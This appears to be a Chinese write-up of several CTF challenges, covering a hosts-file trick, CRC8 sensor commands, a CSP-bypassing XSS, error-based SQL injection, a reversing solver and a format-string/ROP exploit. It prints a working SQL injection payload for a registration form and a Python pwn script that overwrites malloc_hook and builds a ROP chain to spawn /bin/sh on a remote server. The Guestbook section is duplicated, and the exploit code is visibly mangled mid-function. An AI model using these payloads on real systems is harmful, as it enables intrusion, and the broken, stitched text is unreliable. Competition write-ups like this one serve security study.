所以，在操作系统Host表中添加DNS，将misc.ichunqiu.com解析成http://202.5.20.47:8923/
然后对这个服务器进行目录爆破，爆出mysql.bak
这个文件有点意思，需要找改动的地方。脑洞就是在unix操作系统中的换行是n，而在windows中的换行是rn，所以，找改动的地方。找到3处，交了不对。
于是扩大搜索范围，搜索r，发现有8处
将其行号排序，然后计算md5即可。
两个脑洞，一个是服务器拒绝host为IP的请求，另一个是unix和windows换行符号。
**13.传感器2 类型：MISC 分值：250分**
对#0X02 4D 88 45 AB F3 41 19
除了最后一位是校验位，其他都是控制命令和ID号，直接CRC8就可以
更改88 45 AB F3为
再计算就可以了
上图是ID为88 45 AB F3的
**14.Guestbook 类型：WEB 分值：400分**
首先看csp，
    default-src 'self'; 
    script-src 'self' 'unsafe-inline' 'unsafe-eval'; 
    font-src 'self' fonts.gstatic.com; 
    style-src 'self' 'unsafe-inline'; 
    img-src 'self'
然后是沙盒：
发现沙盒和之前0ctf一样，csp也允许了unsafe-eval的执行
然后开始测试，经过测试发现link标签啊，location都被过滤替换成hacker。
但是location很容易绕过例如window['locat'+'ion'].href
所以思路和0ctf一样，用一个iframe从其他路径下“借用”一个XMLHttpRequest，来发送请求，大概初始payload如下：
能够成功获得服务器的返回，但是没有cookie，源码里面也没有flag，通过测试document.referrer，发现这个地址：
首先看csp，
    default-src 'self'; 
    script-src 'self' 'unsafe-inline' 'unsafe-eval'; 
    font-src 'self' fonts.gstatic.com; 
    style-src 'self' 'unsafe-inline'; 
    img-src 'self'
然后是沙盒：
发现沙盒和之前0ctf一样，csp也允许了unsafe-eval的执行
然后开始测试，经过测试发现link标签啊，location都被过滤替换成hacker。
但是location很容易绕过例如window['locat'+'ion'].href
所以思路和0ctf一样，用一个iframe从其他路径下“借用”一个XMLHttpRequest，来发送请求，大概初始payload如下：
能够成功获得服务器的返回，但是没有cookie，源码里面也没有flag，通过测试document.referrer，发现这个地址：
发现无法获取源码，那么尝试通过iframe来获取cookie，思路跟之前DDCTF一个题目的思路一样。
最后修正payload如下：
**  
**
**15.embarrass 类型：MISC 分值：300分**
**16.方舟计划 类型：WEB 分值：400分**
首先扫描发现在注册时手机那一栏存在报错注入
    username='ad121212122min'&phone=' or updatexml(1,concat(0x7e,(/*!50001select*/a.name /*!50001from*/(/*!50001select*/ config.* /*!50001from*/ user config limit 0,1) a),0x7e),1)or'&password='admin'=''#&repassword='admin'=''#
可以获得账户密码 登录进去发现是ffpm读取任意文件
然后读取etc/passwd 被过滤了 稍微绕过一下就能读了 得到用户名s0m3b0dy 在其home目录下读取到flag文件
**17.溯源 类型：REVERSE 分值：200分**
首先是输入长度为200字节，然后每两个字节转化为1个字节，得到100字节的输出。
根据后面的比较可以知道，这100字节分别为0-99这100个数。后面按照特定的顺序将0所在的位置和其上下左右的某个位置的数进行交换。验证经过交换后的数据刚好是0-99顺序排列。
大体思路是构造输入为0-99，得到交换后的数据，可以知道交换的映射关系，然后反过来根据输出为0-100，求输入。
    data = ''
    for i in range(100):
        high = i/0x10
        low = i%0x10
        data += chr(65+high) + chr(65+low)
    print data
    #output of 0-99
    f = open('./result', 'rb')
    d = f.read()
    f.close()
    from zio import *
    dict = {}
    for i in range(100):
        value = l32(d[i*4:i*4+4])
        if value > 100:
            print hex(value)
        dict[value] = i
    data = ''
    for i in range(100):
        high = dict[i]/0x10
        low = dict[i]%0x10
        data += chr(65+high) + chr(65+low)
    print data
**18.NotFormat 类型：PWN 分值：250分**
明显的格式化，在print之后直接调用exit退出了。和0ctf的easyprintf有点类似，参考http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html。与easyprintf不同的是这个题目是静态编译的，程序中没有system函数，因此构造了一个裸的rop去获取shell。
    from threading import Thread
    import operator
    from zio import *
    target = './NotFormat'
    target = ('123.59.71.3', 20020)
    def interact(io):
        def run_recv():
            while True:
                try:
                    output = io.read_until_timeout(timeout=1)
                    # print output
                except:
                    return
        t1 = Thread(target=run_recv)
        t1.start()
        while True:
            d = raw_input()
            if d != '':
                io.writeline(d)
    def format_write(writes, index):
        printed = 0
        payload = ''
        for where, what in sorted(writes.items(), key=operator.itemgetter(1)):
            delta = (what - printed) & 0xffff
            if delta > 0:
                if delta >16)&0xffff
        writes[2] = pop_rdi_ret&0xffff
        writes[3] = (pop_rdi_ret>>16)&0xffff
        writes[4] = (fake_rsp+0x18)&0xffff
        writes[5] = ((fake_rsp+0x18)>>16)&0xffff
        writes[6] = read_buff&0xffff
        writes[7] = (read_buff>>16)&0xffff
        d = format_write(writes, 13+6)
        print len(d)
        d += '%'+str(fake_rsp-0x20)+'s'
        d = d.ljust(13*8, 'a')
        d += l64(malloc_hook) + l64(malloc_hook+2)
        d += l64(fake_rsp) + l64(fake_rsp+2)
        d += l64(fake_rsp+8) + l64(fake_rsp+10)
        d += l64(fake_rsp+0x10) + l64(fake_rsp+0x12)
        print len(d)
        io.gdb_hint()
        io.read_until('!')
        io.writeline(d)
        pop_rax_ret = 0x00000000004C2358
        pop_rdx_rsi_ret = 0x0000000000442c69
        syscall = 0x000000000043EE45
        rop = l64(pop_rdi_ret)+l64(fake_rsp+12*8)
        rop+= l64(pop_rdx_rsi_ret) + l64(0) + l64(0)
        rop+= l64(pop_rax_ret) + l64(0x3b)
        rop += l64(syscall)
        rop += '/bin/shx00'
        rop += '/bin/shx00'
        rop += '/bin/shx00'
        io.writeline(rop)
        interact(io)
    exp(target)